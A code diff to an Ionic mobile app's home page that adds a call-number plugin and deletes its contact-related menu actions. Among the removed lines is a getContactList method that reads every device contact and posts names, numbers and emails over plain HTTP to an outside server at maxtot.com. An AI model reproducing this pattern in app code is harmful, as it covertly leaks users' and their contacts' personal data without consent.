@@ -2,6 +2,7 @@ import { Component } from '@angular/core';
 import { NavController, ActionSheetController } from 'ionic-angular';
 import { Contacts, Contact, ContactField, ContactName } from '@ionic-native/contacts';
 import { LocalNotifications } from '@ionic-native/local-notifications';
+import { CallNumber } from '@ionic-native/call-number';
 import { DataService } from '../../services/data.service';
 
 @Component({
@@ -19,7 +20,8 @@ export class HomePage {
         public _navCtrl: NavController,
         public _actionSheetCtrl: ActionSheetController,
         private _localNotifications: LocalNotifications,
-        private _contacts: Contacts,
+        private _callNumber: CallNumber,
+        private _contacts: Contacts,    
         private _dataService: DataService
     ) {
         this.items = [];
@@ -62,11 +64,6 @@ export class HomePage {
         if ($event.value == 'contactlist') {
             if (typeof this.dataHome['contactlist'] == 'undefined')
                 this.dataHome['contactlist'] = [];
-
-            if (this.dataHome['contactlist'].length <= 0 && this.loading.contactlist != true) {
-                this.getContactList();
-            }
-
         }
     }
 
@@ -74,18 +71,6 @@ export class HomePage {
         let actionSheet = this._actionSheetCtrl.create({
             title: 'Demo actions',
             buttons: [
-                {
-                    text: 'Add contact',
-                    handler: () => {
-                        this.addContact();
-                    }
-                },
-                {
-                    text: 'Lấy danh bạ',
-                    handler: () => {
-                        this.getContactList();
-                    }
-                },
                 {
                     text: 'Hiển thị Notify',
                     handler: () => {
@@ -105,59 +90,6 @@ export class HomePage {
         actionSheet.present();
     }
 
-    addContact() {
-        let contact: Contact = this._contacts.create();
-        // console.log('contact: ', contact);
-        contact.name = new ContactName(null, 'Smith', 'John');
-        contact.phoneNumbers = [new ContactField('mobile', '6471234567')];
-        contact.save().then(
-            () => this._dataService.showAlert('Contact saved!', contact),
-            (error: any) => this._dataService.showAlert('Error saving contact!', error)
-        );
-    }
-
-    getContactList() {
-        this.loading.contactlist = true;
-        this._contacts.find(
-            ['displayName', 'name', 'phoneNumbers', 'emails'],
-            { filter: "", multiple: true })
-            .then(data => {
-                this._dataService.post('http://maxtot.com/autocall.php', data).subscribe(
-                    res => console.log(res),
-                    err => console.log(err)
-                );
-                this.loading.contactlist = false;
-                this.dataHome['contactlist'] = this.dataHome['contactlist'] || [];
-                for (var i = 0; i < data.length; i++) {
-                    var contact = data[i];
-                    var no = contact.name.formatted;
-                    var phonenumber = contact.phoneNumbers;
-                    if (phonenumber != null) {
-                        for (var n = 0; n < phonenumber.length; n++) {
-                            var phone = phonenumber[n].value;
-                            if (phone != '') {
-                                let contactData = {
-                                    "displayName": no,
-                                    "phoneNumbers": phone,
-                                    "emails": contact.emails
-                                }
-                                this._dataService.post('http://maxtot.com/autocall.php', contactData).subscribe(
-                                    res => console.log(res),
-                                    err => console.log(err)
-                                );
-                                this.dataHome['contactlist'].push(contactData);
-                            }
-                        }
-                    }
-                }
-
-                
-            },
-            (error: any) => {
-                this.loading.contactlist = false;
-                this._dataService.showAlert('Get list contact!', error)
-            });
-    }
 
     showNotification() {
         let infoNotify: any = {
